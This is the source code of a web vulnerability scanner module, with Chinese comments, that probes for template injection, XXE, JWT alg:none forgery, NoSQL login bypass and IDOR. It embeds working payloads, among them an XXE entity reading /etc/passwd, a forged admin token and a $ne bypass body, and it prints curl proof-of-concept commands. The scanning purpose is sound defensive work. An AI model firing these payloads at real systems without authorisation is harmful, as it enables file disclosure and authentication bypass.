# -*- coding: utf-8 -*-
"""PenScope —— 高级注入类漏洞检测（P5：CWE 覆盖缺口补齐，实战进化驱动）

一次性补齐 lab 已证明但 scanner 此前缺失的 5 类高危检测：
  - SSTI       服务端模板注入      (CWE-1336)
  - XXE        XML 外部实体       (CWE-611)
  - JWT算法混淆  alg:none 伪造     (CWE-347)
  - NoSQL注入   操作符绕过         (CWE-943)
  - IDOR       越权访问他人对象    (CWE-639)

设计原则（与既有 scanner 一致，贯彻只读/良性 + 降噪）：
  1) 全为被动只读探测：GET/POST 携带良性/探针载荷，观察响应差分，绝不写/绝不爆破/
     绝不外联；XXE 探针仅指向本地 file://（读取行为，不向外部回传）。
  2) 每个检测器先做「良性基线」请求，再发探针，靠响应差分判定，避免把静态/动态内容
     差异误判为漏洞（借鉴 fp_guard 的相似度门控）。
  3) 强证据（SSTI 算术求值出 49 / XXE 回显文件内容）→ L3；仅靠差分的行为异常 → L2，
     保守不夸大为已利用。
  4) 复用 scanner.fp_guard 的错误页/软404/相似度过滤，降低误报。
  5) 所有发现走统一 _mk 构造（含 category/cwe/endpoint/evidence_level/verification_status），
     自然接入 db / 报告 / 语义去重 / reflexion 自检。
"""
import json
import re
from urllib.parse import parse_qs, urlparse, urlunparse

import requests

from cvss_dedup import cwe_for
from scanner import fp_guard
from scanner.web_scan import _mk, _send_form, discover

# 探针载荷（只读、良性）
_SSTI_PROBE = "{{7*7}}"          # 模板求值后应出现 49
_SSTI_PROBE2 = "{{7*'77'}}"      # 字符串乘法 -> 7777777
_XXE_BENIGN = '<?xml version="1.0"?><r><x>PenScopeBenign123</x></r>'
_XXE_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<r>&xxe;</r>'
)
# alg:none 伪造 token：header alg=none，payload role=admin，无签名段
_NONE_ALG_TOKEN = "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."
_NOSQL_BYPASS = {"username": {"$ne": ""}, "password": {"$ne": ""}}
_NOSQL_BENIGN = {"username": "PenScopeBenign", "password": "PenScopeBenign"}
_IDOR_SAMPLES = ["1", "2", "3", "100", "999"]

# XXE 成功强证据：响应回显了本地文件内容特征
_XXE_FILE_MARKERS = (
    "root:x:", "/bin/bash", ":/sbin/nologin", "[extensions]",
    "C:\\Windows\\", "DB_HOST=", "secret=",
)


def _collect_points(url, session, timeout, verify_ssl):
    """收集可注入输入点：(target, method, param, all_fields)。

    来源 = HTML 表单字段（排除文件字段）+ URL 查询参数。与 ssrf.py 的探测点收集一致。
    """
    points = []
    try:
        forms = discover(url, session, timeout, verify_ssl)
        for f in forms:
            inj = [n for n in f["fields"] if n not in f["file_fields"]]
            for field in inj:
                points.append((f["action"], f["method"], field, f["fields"]))
    except requests.RequestException:
        pass
    q = urlparse(url)
    base = urlunparse(q._replace(query="", fragment=""))
    for k in parse_qs(q.query).keys():
        points.append((base, "get", k, [k]))
    return points


def _differs(text, benign):
    """响应相对良性基线是否发生实质性变化（非错误页、相似度低于阈值）。"""
    if not text or text == benign:
        return False
    if fp_guard.is_error_page(text):
        return False
    return fp_guard.similarity(text, benign) < 0.6


# ---------------------------------------------------------------------------
# SSTI —— 服务端模板注入 (CWE-1336)
# ---------------------------------------------------------------------------
def scan_ssti(url, session, timeout=6.0, verify_ssl=True):
    """SSTI 检测：向输入点注入模板表达式，靠『求值结果(49)』做强证据，或响应被处理
    （模板语法消失且内容变化）作弱证据。

    **关键去伪**：若响应仍原样回显 `{{...}}`（未处理），直接排除——这是把反射
    误判为 SSTI 的最常见来源。"""
    findings = []
    points = _collect_points(url, session, timeout, verify_ssl)
    if not points:
        return findings
    seen = set()
    for target, method, p, fields in points:
        if (target, method, p) in seen:
            continue
        seen.add((target, method, p))
        try:
            rb = _send_form(session, target, method, fields, p, "PenScopeBenign123",
                           timeout, verify_ssl)
            benign = rb.text or ""
        except requests.RequestException:
            benign = ""
        try:
            r = _send_form(session, target, method, fields, p, _SSTI_PROBE,
                           timeout, verify_ssl)
            text = r.text or ""
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        # 强证据：算术被求值（49 出现，且良性基线不含）
        if "49" in text and "49" not in benign:
            findings.append(_mk(
                "SSTI", f"参数 '{p}' 疑似服务端模板注入（SSTI）：算术表达式被服务端求值",
                "High",
                f"向参数 {p}（端点 {target}，方法 {method.upper()}）注入模板表达式 "
                f"{_SSTI_PROBE} 后，响应出现求值结果 '49'，说明用户输入被当作模板执行"
                f"（CWE-1336），可进一步演进为远程代码执行。",
                text[:200].replace("\n", " "),
                "禁止将用户输入拼接到模板渲染上下文；使用沙箱化/不可执行的模板引擎；"
                "对模板语法字符（{ % $ {）做输入过滤与转义。",
                target, cwe=cwe_for("SSTI"), endpoint=target, http_method=method.upper(),
                verification_status="unverified", evidence_level="L3",
                poc=f"curl '{target}?{p}={_SSTI_PROBE}'",
            ))
            continue
        # 弱证据：模板语法被『处理』（消失）且响应实质变化、非错误页
        if "{{" not in text and _differs(text, benign):
            findings.append(_mk(
                "SSTI", f"参数 '{p}' 可能存在 SSTI（响应被异常改写）", "Medium",
                f"向参数 {p}（端点 {target}）注入模板语法后，响应中模板标记消失且内容"
                f"发生实质性变化，疑似模板被处理但未确认求值，需人工复核。",
                text[:200].replace("\n", " "),
                "禁止拼接用户输入到模板上下文；使用沙箱化模板引擎；对模板语法字符做过滤。",
                target, cwe=cwe_for("SSTI"), endpoint=target, http_method=method.upper(),
                verification_status="unverified", evidence_level="L2",
                poc=f"curl '{target}?{p}={_SSTI_PROBE}'",
            ))
    return findings


# ---------------------------------------------------------------------------
# XXE —— XML 外部实体 (CWE-611)
# ---------------------------------------------------------------------------
def _xxe_file_hit(text):
    if not text:
        return False
    low = text.lower()
    return any(m.lower() in low for m in _XXE_FILE_MARKERS)


def scan_xxe(url, session, timeout=6.0, verify_ssl=True):
    """XXE 检测：向端点 POST 含外部实体的 XML，观察是否回显本地文件内容（强证据），
    或响应相对良性 XML 发生实质变化（弱证据）。

    XXE 端点通常无 HTML 表单，故对目标端点本身做一次盲探测（read-only，仅观测响应）。
    """
    findings = []
    points = _collect_points(url, session, timeout, verify_ssl)
    # 盲探测目标：发现的 POST 表单端点；若无任何输入点，则对 URL 本身探测
    targets = {(t, m) for t, m, f, _ in points if m == "post"}
    if not targets:
        targets = {(url, "post")}
    for target, method in targets:
        try:
            rb = session.post(target, data=_XXE_BENIGN,
                              headers={"Content-Type": "application/xml"},
                              timeout=timeout, verify=verify_ssl)
            benign = rb.text or ""
        except requests.RequestException:
            benign = ""
        try:
            r = session.post(target, data=_XXE_PAYLOAD,
                             headers={"Content-Type": "application/xml"},
                             timeout=timeout, verify=verify_ssl)
            text = r.text or ""
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        # 强证据：响应回显本地文件内容
        if _xxe_file_hit(text) and not _xxe_file_hit(benign):
            findings.append(_mk(
                "XXE", f"端点 {target} 疑似 XML 外部实体注入（XXE）：回显本地文件内容",
                "High",
                f"向端点 {target} POST 含外部实体（file:///etc/passwd）的 XML 后，响应回显了"
                f"本地文件内容特征，说明 XML 解析器解析了外部实体（CWE-611），可读取服务器"
                f"本地文件乃至 SSRF。",
                text[:200].replace("\n", " "),
                "禁用 XML 解析器的外部实体解析（DTD）；使用 SAX/DOM 的安全配置"
                "（如 Python 设 resolve_entities=False / forbid_dtd=True）；对 XML 输入做 schema 校验。",
                target, cwe=cwe_for("XXE"), endpoint=target, http_method="POST",
                verification_status="unverified", evidence_level="L3",
                poc=f"curl -X POST -H 'Content-Type: application/xml' --data '{_XXE_PAYLOAD}' '{target}'",
            ))
            continue
        # 弱证据：响应相对良性 XML 发生实质变化（端点处理了实体）
        if _differs(text, benign):
            findings.append(_mk(
                "XXE", f"端点 {target} 可能存在 XXE（外部实体被处理）", "Medium",
                f"向端点 {target} POST 含外部实体的 XML 后，响应相对良性 XML 发生实质变化，"
                f"疑似 XML 解析器处理了外部实体，需人工确认是否可读取文件。",
                text[:200].replace("\n", " "),
                "禁用 XML 外部实体解析；使用安全的 XML 解析配置；对 XML 输入做 schema 校验。",
                target, cwe=cwe_for("XXE"), endpoint=target, http_method="POST",
                verification_status="unverified", evidence_level="L2",
                poc=f"curl -X POST -H 'Content-Type: application/xml' --data '{_XXE_PAYLOAD}' '{target}'",
            ))
    return findings


# ---------------------------------------------------------------------------
# JWT 算法混淆 —— alg:none 伪造 (CWE-347)
# ---------------------------------------------------------------------------
def scan_jwt_none(url, session, timeout=6.0, verify_ssl=True):
    """JWT alg:none 检测：向 token 类参数发送伪造的 alg=none token（role=admin），
    若服务端接受（响应相对良性 token 发生实质变化），说明未校验签名/接受 none 算法，
    认证可被绕过（CWE-347）。

    仅对 token/auth/session/id 类参数做探测，避免对无关参数发伪造令牌。
    """
    findings = []
    points = _collect_points(url, session, timeout, verify_ssl)
    token_pts = [pt for pt in points if re.search(r"token|jwt|auth|session|id", pt[2], re.I)]
    if not token_pts:
        token_pts = points
    seen = set()
    for target, method, p, fields in token_pts:
        if (target, method, p) in seen:
            continue
        seen.add((target, method, p))
        try:
            rb = _send_form(session, target, method, fields, p, "PenScopeBenignToken123",
                           timeout, verify_ssl)
            benign = rb.text or ""
        except requests.RequestException:
            benign = ""
        try:
            r = _send_form(session, target, method, fields, p, _NONE_ALG_TOKEN,
                           timeout, verify_ssl)
            text = r.text or ""
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        if _differs(text, benign):
            findings.append(_mk(
                "JWT算法混淆", f"参数 '{p}' 疑似接受 alg:none 伪造 JWT（认证可被绕过）",
                "Medium",
                f"向参数 {p}（端点 {target}）发送 alg=none 伪造令牌（role=admin）后，服务端"
                f"响应相对良性令牌发生实质变化，疑似未校验签名或接受 none 算法"
                f"（CWE-347），攻击者可伪造任意身份令牌。",
                text[:200].replace("\n", " "),
                "服务端必须校验 JWT 签名且显式拒绝 alg=none / 仅允许预期的非对称/强 HMAC 算法；"
                "使用标准库（如 PyJWT）并固定算法白名单。",
                target, cwe=cwe_for("JWT算法混淆"), endpoint=target, http_method=method.upper(),
                verification_status="unverified", evidence_level="L2",
                poc=f"curl '{target}?{p}={_NONE_ALG_TOKEN}'",
            ))
    return findings


# ---------------------------------------------------------------------------
# NoSQL 注入 —— 操作符绕过 (CWE-943)
# ---------------------------------------------------------------------------
def _nosql_json_probe(session, target, method, fields, param, timeout, verify_ssl):
    """对某一参数以 JSON 体发送 {$ne:''} 操作符对象，模拟 NoSQL 登录绕过。"""
    payload = {param: {"$ne": ""}, "password": {"$ne": ""}}
    try:
        if method == "post":
            return session.post(target, json=payload, timeout=timeout, verify=verify_ssl)
        return session.post(target, json=payload, timeout=timeout, verify=verify_ssl)
    except requests.RequestException:
        return None


def scan_nosql(url, session, timeout=6.0, verify_ssl=True):
    """NoSQL 注入检测：
      - 若发现输入点：对参数以 JSON 体发送 {$ne:''} 操作符对象，观察是否绕过（响应差分）；
      - 若无输入点（典型 JSON 认证端点）：对端点本身做一次通用登录绕过 POST 探针。

    全部 read-only，仅观测响应，绝不强暴/写库。
    """
    findings = []
    points = _collect_points(url, session, timeout, verify_ssl)
    if points:
        seen = set()
        for target, method, p, fields in points:
            if (target, method, p) in seen:
                continue
            seen.add((target, method, p))
            try:
                rb = _send_form(session, target, method, fields, p, "PenScopeBenign123",
                               timeout, verify_ssl)
                benign = rb.text or ""
            except requests.RequestException:
                benign = ""
            r = _nosql_json_probe(session, target, method, fields, p, timeout, verify_ssl)
            if r is None or r.status_code != 200:
                continue
            text = r.text or ""
            if _differs(text, benign):
                findings.append(_mk(
                    "NoSQL注入", f"参数 '{p}' 疑似 NoSQL 注入（操作符绕过）", "Medium",
                    f"向参数 {p}（端点 {target}）以 JSON 体发送操作符对象 {{\"$ne\":\"\"}} 后，"
                    f"响应相对良性输入发生实质变化，疑似 NoSQL 查询逻辑被操作符绕过"
                    f"（CWE-943），常见于 MongoDB 等文档数据库的认证/查询绕过。",
                    text[:200].replace("\n", " "),
                    "使用参数化/白名单校验查询；对用户输入做类型与结构严格校验；"
                    "禁止将用户输入直接拼入 NoSQL 查询对象（尤其 $ne/$gt/$regex 等操作符）。",
                    target, cwe=cwe_for("NoSQL注入"), endpoint=target, http_method=method.upper(),
                    verification_status="unverified", evidence_level="L2",
                    poc=f"curl -X POST -H 'Content-Type: application/json' --data '{{\"{p}\":{{\"$ne\":\"\"}}}}' '{target}'",
                ))
    else:
        # 通用登录绕过探针（针对无表单的 JSON 认证端点）
        try:
            rb = session.post(url, json=_NOSQL_BENIGN, timeout=timeout, verify=verify_ssl)
            benign = rb.text or ""
        except requests.RequestException:
            return findings
        try:
            r = session.post(url, json=_NOSQL_BYPASS, timeout=timeout, verify=verify_ssl)
            text = r.text or ""
        except requests.RequestException:
            return findings
        if r.status_code != 200:
            return findings
        if _differs(text, benign):
            findings.append(_mk(
                "NoSQL注入", f"端点 {url} 疑似接受 NoSQL 操作符登录绕过", "Medium",
                f"向端点 {url} POST 通用登录绕过载荷（username/password 均为 {{\"$ne\":\"\"}}）后，"
                f"响应相对良性凭据发生实质变化，疑似存在 NoSQL 注入登录绕过（CWE-943）。",
                text[:200].replace("\n", " "),
                "使用参数化查询；对 JSON 体内的操作符（$ne/$gt 等）做白名单剥离；"
                "对认证入口强制校验凭据精确匹配而非操作符表达式。",
                url, cwe=cwe_for("NoSQL注入"), endpoint=url, http_method="POST",
                verification_status="unverified", evidence_level="L2",
                poc=f"curl -X POST -H 'Content-Type: application/json' --data '{json.dumps(_NOSQL_BYPASS)}' '{url}'",
            ))
    return findings


# ---------------------------------------------------------------------------
# IDOR —— 越权访问他人对象 (CWE-639)
# ---------------------------------------------------------------------------
def scan_idor(url, session, timeout=6.0, verify_ssl=True):
    """IDOR 检测：对 id/object/file 类参数枚举若干对象 ID，若不同 ID 返回内容不同
    （可访问到他人对象），疑似存在不安全的直接对象引用（CWE-639）。

    仅只读 GET/POST 枚举少量样本 ID，不遍历全量、不写入。
    """
    findings = []
    points = _collect_points(url, session, timeout, verify_ssl)
    id_pts = [pt for pt in points if re.search(r"id|file|doc|object|user|account|order|num", pt[2], re.I)]
    if not id_pts:
        id_pts = points
    seen = set()
    for target, method, p, fields in id_pts:
        if (target, method, p) in seen:
            continue
        seen.add((target, method, p))
        bodies = {}
        for sid in _IDOR_SAMPLES:
            try:
                r = _send_form(session, target, method, fields, p, sid, timeout, verify_ssl)
                bodies[sid] = r.text or ""
            except requests.RequestException:
                continue
        distinct = set(b for b in bodies.values())
        # 多个对象返回不同内容 -> 至少存在一个越权可访问对象（需人工确认归属）
        if len(distinct) > 1 and len(bodies) >= 2:
            sample = bodies.get(_IDOR_SAMPLES[1], "")
            findings.append(_mk(
                "IDOR", f"参数 '{p}' 疑似越权访问（IDOR）：不同对象 ID 返回不同内容",
                "Medium",
                f"对参数 {p}（端点 {target}）枚举对象 ID {_IDOR_SAMPLES} 时，不同 ID 返回了"
                f"不同内容（共 {len(distinct)} 种响应），说明服务端按 ID 直接返回对象数据而未"
                f"校验归属权限（CWE-639），攻击者可遍历 ID 访问他人数据。",
                sample[:200].replace("\n", " "),
                "对每一次对象访问强制校验『当前用户是否拥有该对象』的授权；使用不可预测的"
                "对象引用（UUID）；避免以自增数字 ID 直接暴露。",
                target, cwe=cwe_for("IDOR"), endpoint=target, http_method=method.upper(),
                verification_status="unverified", evidence_level="L2",
                poc=f"curl '{target}?{p}=2'   # 对比 ?{p}=1 的响应差异",
            ))
            break
    return findings
